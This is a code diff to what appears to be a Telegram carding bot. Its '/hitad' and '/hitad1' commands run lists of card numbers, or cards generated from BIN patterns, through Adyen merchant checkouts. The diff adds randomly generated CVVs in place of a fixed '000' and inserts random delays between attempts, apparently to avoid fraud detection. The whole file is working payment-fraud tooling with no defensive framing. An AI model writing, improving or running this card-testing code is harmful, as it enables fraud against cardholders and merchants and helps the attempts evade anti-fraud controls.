@@ -925,16 +925,17 @@ def parse_ccn_input(payload_tokens: list, raw_payload: str):
             'cvv': m[3]
         })
 
-    # 2. Check for card|mm|yy (3 parts - CCN format without CVV)
+    # 2. Check for card|mm|yy (3 parts - CCN format, assign synthetic CVV)
     ccn_matches = re.findall(r'(\d{13,19})[|/](\d{1,2})[|/](\d{2,4})', raw_payload)
     for m in ccn_matches:
         if m[0] not in matched_cards:
             matched_cards.add(m[0])
+            synth_cvv = f"{random.randint(1000, 9999):04d}" if m[0].startswith(('34', '37')) else f"{random.randint(100, 999):03d}"
             cards.append({
                 'card': m[0],
                 'month': m[1].zfill(2),
                 'year': m[2].zfill(2) if len(m[2]) <= 2 else m[2][-2:],
-                'cvv': '000'
+                'cvv': synth_cvv
             })
 
     if cards:
@@ -962,17 +963,18 @@ def parse_ccn_input(payload_tokens: list, raw_payload: str):
             raw_gen_cards = generate_bin_cards(potential_bin, count)
             for gc in raw_gen_cards:
                 gp = gc.split('|')
-                cards.append({'card': gp[0], 'month': gp[1], 'year': gp[2], 'cvv': '000'})
+                cards.append({'card': gp[0], 'month': gp[1], 'year': gp[2], 'cvv': gp[3]})
             if not cards:
                 return None, "BIN pattern generation failed."
             return cards, None
 
-    # 4. Raw card numbers (just digits) - fallback with random expiry
+    # 4. Raw card numbers (just digits) - fallback with random expiry and synthetic CVV
     raw_numbers = re.findall(r'\b(\d{13,19})\b', raw_payload)
     if raw_numbers:
         for num in raw_numbers[:10]:
             m, y = rand_expiry()
-            cards.append({'card': num, 'month': m, 'year': y, 'cvv': '000'})
+            synth_cvv = f"{random.randint(1000, 9999):04d}" if num.startswith(('34', '37')) else f"{random.randint(100, 999):03d}"
+            cards.append({'card': num, 'month': m, 'year': y, 'cvv': synth_cvv})
         return cards, None
 
     return None, "Invalid format. Usage:\n/hitad1 [url] cc|mm|yy ...\nOR\n/hitad1 [url] [bin_pattern] [count=10]"
@@ -1028,6 +1030,9 @@ async def hitad1_command(message: types.Message):
             if user_id not in active_sessions or link_dead:
                 break
 
+            if idx > 1:
+                await asyncio.sleep(random.uniform(0.5, 1.0))
+
             adyen_engine = AdyenHitter(url, proxy_data=proxy_data)
             res = await adyen_engine.hit_ccn(card, idx, user_id)
             results.append(res)
@@ -1043,7 +1048,7 @@ async def hitad1_command(message: types.Message):
                     pass
                 break
 
-            card_str = f"{res['card']['card']}|{res['card']['month']}|{res['card']['year']}|CCN"
+            card_str = f"{res['card']['card']}|{res['card']['month']}|{res['card']['year']}|{res['card'].get('cvv', '000')}"
             merchant_name = res.get('merchant') or merchant_name
             if res.get('amount'):
                 amount_str = res['amount']
@@ -1185,6 +1190,10 @@ async def hitad_command(message: types.Message):
         for idx, card in enumerate(cards, 1):
             if user_id not in active_sessions:
                 break
+
+            if idx > 1:
+                await asyncio.sleep(random.uniform(0.5, 1.0))
+
             res = await adyen_engine.hit(card, idx, user_id)
             results.append(res)
             
